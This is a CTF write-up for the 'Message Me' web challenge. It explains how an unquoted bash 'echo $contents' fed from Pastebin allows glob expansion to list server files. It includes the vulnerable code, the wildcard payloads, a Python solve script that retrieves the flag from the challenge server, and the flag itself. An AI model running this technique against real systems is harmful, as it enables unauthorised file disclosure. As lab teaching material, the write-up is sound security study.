# Message Me - CTF Writeup

**Challenge:** Message Me
**Category:** Web / Bash Injection
**Points:** 50

![](attachments/Pasted%20image%2020251130153453.png)

## Challenge
![](attachments/Pasted%20image%2020251130153504.png)

## Code Analysis

**PHP Code:**
```php
<?php 
if(isset($_GET['message']) && preg_match('/^[a-zA-Z0-9]+$/', $_GET['message'])){ 
    system('/bin/bash curl.sh '. escapeshellarg($_GET['message']));
    exit(); 
} else { 
    highlight_file(__FILE__); 
} 
?>
```
The PHP script sanitizes the `message` input (alphanumeric only) and escapes it for the shell. This prevents direct command injection in the PHP `system` call.

**Bash Script (`curl.sh`):**
```bash
contents=$(curl "https://pastebin.com/raw/$1")
if [[ ${#contents} -gt 5 ]];then
    echo "I can't read your message. It is too large."
else
    echo $contents
fi
```

The Bash script fetches the Pastebin content.
Crucially, `echo $contents` is **unquoted**.
In Bash, unquoted variable expansion is subject to **globbing (wildcard expansion)**.
If `$contents` contains `*`, `echo *` will print all files in the current directory.

## Exploitation Strategy

1.  **Reconnaissance:** We need to list the files in the directory to find the flag.
2.  **Wildcard Injection:**
    *   We created a Pastebin paste containing just `*`.
    *   The script fetched it, `contents` became `*`.
    *   `echo *` executed, listing the files: `94397840edf5e182801f1d16aa64e3e0 curl.sh index.php`.
3.  **Deep Listing:**
    *   We saw a suspicious directory `94397840edf5e182801f1d16aa64e3e0`.
    *   We updated the Pastebin paste to `*/*`.
    *   The script fetched it, `contents` became `*/*`.
    *   `echo */*` executed, listing the contents of the subdirectory: `94397840edf5e182801f1d16aa64e3e0/flag_aa4c714b40f182112c68d231feaa2625.txt`.
4.  **Retrieval:**
    *   We accessed the flag file directly via the web server: `http://38.60.200.116:8084/94397840edf5e182801f1d16aa64e3e0/flag_aa4c714b40f182112c68d231feaa2625.txt`.

## 4. Execution

We used a Python script to automate the interaction, but the core exploit relied on controlling the Pastebin content.

**Flag:** `NOVA_CTF{0H_y0U_KN0w_BaSH_Scr!ptInG_w3Ll_74f8386dd9d4004bae1a01a45cae5f01}`


```
import requests
import re

url = "http://38.60.200.116:8084"
# Pastebin ID containing "*/*" to trigger wildcard expansion in subdirectories
# created pastebin account and here is the id
paste_id = "X20nCwxb" 

def solve():
    print(f"[*] Triggering exploit with paste_id={paste_id}...")
    params = {'message': paste_id}
    
    try:
        r = requests.get(url, params=params)
        print(f"[*] Status: {r.status_code}")
        
        # Look for the flag file pattern in the response
        # Response contains the output of 'echo */*'
        match = re.search(r'([a-f0-9]{32}/flag_[a-f0-9]{32}\.txt)', r.text)
        
        if match:
            flag_path = match.group(1)
            print(f"[+] Found flag path: {flag_path}")
            
            flag_url = f"{url}/{flag_path}"
            print(f"[*] Fetching flag from {flag_url}...")
            
            r_flag = requests.get(flag_url)
            if r_flag.status_code == 200:
                flag = r_flag.text.strip()
                print(f"[+] Flag: {flag}")
                with open("flag.txt", "w") as f:
                    f.write(flag)
            else:
                print(f"[-] Failed to fetch flag file. Status: {r_flag.status_code}")
        else:
            print("[-] Flag file not found in response.")
            print(f"Response snippet: {r.text[:200]}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()
```


